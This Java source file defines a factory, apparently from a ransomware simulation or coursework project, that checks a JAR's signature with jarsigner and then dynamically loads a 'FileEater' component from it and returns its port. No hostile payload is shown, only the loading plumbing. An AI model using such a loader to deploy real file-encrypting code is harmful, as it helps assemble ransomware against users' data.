package leverCom;

import configuration.Configuration;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLClassLoader;


public class RansomwareFactory {

    private static Boolean checkSignature(){
        try{
            ProcessBuilder processBuilder = new ProcessBuilder(Configuration.instance.pathToJarsigner, "-verify", Configuration.instance.pathToJavaArchive);
            Process process = processBuilder.start();
            process.waitFor();

            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            String line;

            while ((line = bufferedReader.readLine()) != null) {
                if (line.contains("verified")) {
                    return true;
                }
            }
        }catch (Exception ex){
            System.err.println(ex.getMessage());
            ex.printStackTrace();
        }
        return false;
    }


    @SuppressWarnings("unchecked")
    public static Object build() {
        Object compPort = null;

        try {
            if(!checkSignature()) throw  new Exception("JAR not verified - aborting!");
            URL[] urls = {new File(Configuration.instance.pathToJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, RansomwareFactory.class.getClassLoader());
            Class fileEaterClass = Class.forName("FileEater", true, urlClassLoader);
            Object fileEaterInstance = fileEaterClass.getMethod("getInstance").invoke(null);
            compPort = fileEaterClass.getDeclaredField("port").get(fileEaterInstance);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            ex.printStackTrace();
        }

        return compPort;
    }
}
